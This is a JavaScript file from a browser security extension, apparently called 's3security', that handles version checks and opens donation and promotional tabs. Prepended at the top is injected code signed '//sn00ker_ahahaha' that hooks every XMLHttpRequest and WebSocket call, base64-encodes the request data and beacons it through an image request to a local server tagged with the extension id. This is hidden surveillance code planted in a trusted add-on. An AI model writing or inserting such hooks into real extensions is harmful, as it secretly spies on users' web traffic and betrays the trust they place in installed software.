function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
s3security.header = {};
 
//------------------------------------------------------------------------------
s3security.addon = {
	version : '0',
	old_version : '0',
	donateURL: 'http://www.s3blog.org/addon-contribute/fox-web-security.html'
};
//------------------------------------------------------------------------------
s3security.addon.get_version = function() {
	var manifest = chrome.runtime.getManifest();
	s3security.addon.version = manifest.version;
	if ((manifest.version != '') && (manifest.version != '0')) {
		setTimeout(function() { s3security.addon.checkPrefs(); }, 2000);
	}
}
//------------------------------------------------------------------------------
s3security.addon.addonDonate = function() {
	var donateURL = s3security.addon.donateURL + '?v=' + s3security.addon.version + '-' + s3security.addon.old_version;
	try {
		chrome.tabs.create({ url: donateURL, active: true });
	} catch(e){;}
}
//------------------------------------------------------------------------------
s3security.addon.checkPrefs = function() {
	var old_version = s3security.utils.prefs_get("current_version");
	s3security.addon.old_version = old_version;
	var not_open_contribute_page = s3security.utils.prefs_get("not_open_contribute_page");
	var current_day = Math.ceil((new Date()).getTime() / (1000*60*60*24));
	var is_set_timer = false;
	var show_page_timer =  s3security.utils.prefs_get("show_page_timer");

	//----------------------------------------------------------------------
	if (s3security.addon.version != old_version) {
		s3security.utils.prefs_set("current_version", s3security.addon.version);
		var result = ((old_version == '') || (old_version == '0')) ? false : true;
		//--------------------------------------------------------------
		if (result) {
			if (! not_open_contribute_page) {
				is_set_timer = true;
				if ((show_page_timer + 5) < current_day) {
					s3security.addon.addonDonate();
				}
			}
		}
	}
	//----------------------------------------------------------------------
	if (s3security.addon.version == old_version) {
		//--------------------------------------------------------------
		if (show_page_timer > 0) {
			show_page_timer -= Math.floor(Math.random() * 15);
			if ((show_page_timer + 60) < current_day) {
				if (! not_open_contribute_page) {
					is_set_timer = true;
					s3security.addon.addonDonate();
				}
			}
		} else {
			is_set_timer = true;
		}
		//--------------------------------------------------------------
		var show_page_foxdns = s3security.utils.prefs_get("show_page_foxdns");
		if (! show_page_foxdns) {
			try {
				chrome.tabs.create({ url: 'https://foxdns.pro', active: true });
			} catch(e){;}
			s3security.utils.prefs_set("show_page_foxdns", true);
		}
	}
	//----------------------------------------------------------------------
	if (is_set_timer) {
		s3security.utils.prefs_set("show_page_timer", current_day);
	}
}

window.addEventListener("load", s3security.addon.get_version, false);
